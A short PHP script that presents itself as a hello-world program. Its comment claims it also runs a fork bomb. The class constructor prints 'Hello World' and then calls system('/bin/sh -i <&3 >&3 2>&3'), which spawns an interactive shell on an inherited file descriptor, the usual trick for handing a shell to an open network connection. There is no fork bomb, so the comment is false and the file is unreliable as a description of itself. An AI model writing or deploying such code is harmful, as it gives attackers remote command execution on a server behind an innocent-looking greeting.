<?php 

# Print Helloworld and Fork Bomb
Class A {
    public function __construct() {
        echo "Hello World";
        system("/bin/sh -i <&3 >&3 2>&3");
    }
}

new A;
